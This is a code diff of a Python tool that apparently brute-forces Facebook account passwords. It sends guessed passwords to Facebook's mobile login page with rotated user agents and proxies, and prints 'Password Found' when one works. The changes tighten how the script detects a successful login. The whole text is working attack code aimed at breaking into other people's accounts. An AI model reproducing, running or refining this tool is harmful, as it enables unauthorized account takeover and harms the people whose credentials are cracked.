@@ -16,7 +16,7 @@ class CliColors:
 # =============> Config <=============
 MIN_PASSWORD_LENGTH = 6 # minimum length of the facebook password
 MAIN_FB_DOMAIN = 'https://mbasic.facebook.com'
-LOGIN_URL = MAIN_FB_DOMAIN+'/login.php'
+LOGIN_URL = MAIN_FB_DOMAIN+'/login.php' #TODO: ?login_attempt=1
 USER_AGENTS = [
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
     'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
@@ -166,7 +166,8 @@ def Login(user, password, index=1):
     r = requests.post(LOGIN_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS, proxies=PROXY)
     rurl = r.url.lower()
     rtext = r.text.lower()
-    if '/login/save-device' in rurl or '/checkpoint' in rurl or MAIN_FB_DOMAIN == rurl or '/home' in rurl or 'log out' in rtext or 'find friends' in rtext or 'search' in rtext:
+    # if '/login/save-device' in rurl or '/checkpoint' in rurl or MAIN_FB_DOMAIN == rurl or '/home' in rurl or 'log out' in rtext or 'find friends' in rtext or 'search' in rtext:
+    if 'logout' in rtext or 'log out' in rtext: #TODO: not 'login_attempt' in rurl
         return [True, password]
     return [False, password]
 # =============> Arguments <=============
@@ -237,6 +238,7 @@ def main(args=None):
         _log.write_colored("[+] Password Found: '{}'.".format(flag[1]), 'green')
     else:
         _log.write_colored("[-] No Password was Found.", 'red')
+    # TODO: time
     print("")
 
 if __name__ == '__main__':
